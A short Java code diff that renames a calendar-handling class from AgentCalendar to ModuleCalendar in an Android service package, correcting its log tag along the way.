@@ -30,9 +30,9 @@ import com.android.service.util.DateTime;
 import com.android.service.util.Utils;
 import com.android.service.util.WChar;
 
-public class AgentCalendar extends BaseModule {
+public class ModuleCalendar extends BaseModule {
 
-	private static final String TAG = "AgentAddressbook"; //$NON-NLS-1$
+	private static final String TAG = "ModuleCalendar"; //$NON-NLS-1$
 
 
 	private static final int FLAG_ALLDAY = 0x00000040;
@@ -48,7 +48,7 @@ public class AgentCalendar extends BaseModule {
 
 	HashMap<Long, Long> calendar;
 
-	public AgentCalendar() {
+	public ModuleCalendar() {
 
 	}
 
